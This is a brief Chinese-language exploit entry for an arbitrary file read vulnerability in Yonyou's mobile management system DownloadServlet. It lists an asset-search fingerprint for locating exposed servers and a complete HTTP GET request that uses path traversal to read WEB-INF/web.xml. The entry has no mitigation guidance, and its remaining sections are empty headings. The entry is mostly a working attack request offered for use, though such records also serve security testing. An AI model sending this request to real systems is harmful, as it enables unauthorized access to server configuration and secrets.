# 用友移动管理系统DownloadServlet存在任意文件读取漏洞

- **系统**：用友　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app="用友-移动系统管理"`
- **请求**：`GET /servlet/~maportal/;/com.yonyou.maportal.bs.padplugin.controller.DownloadServlet?filename=../../WEB-INF/web.xml HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`SL-CE-SUID: 18`　`Content-Length: 0`

**请求体 / payload**
```

```

**其他**
- 用友移动管理系统DownloadServlet存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友移动系统管理系统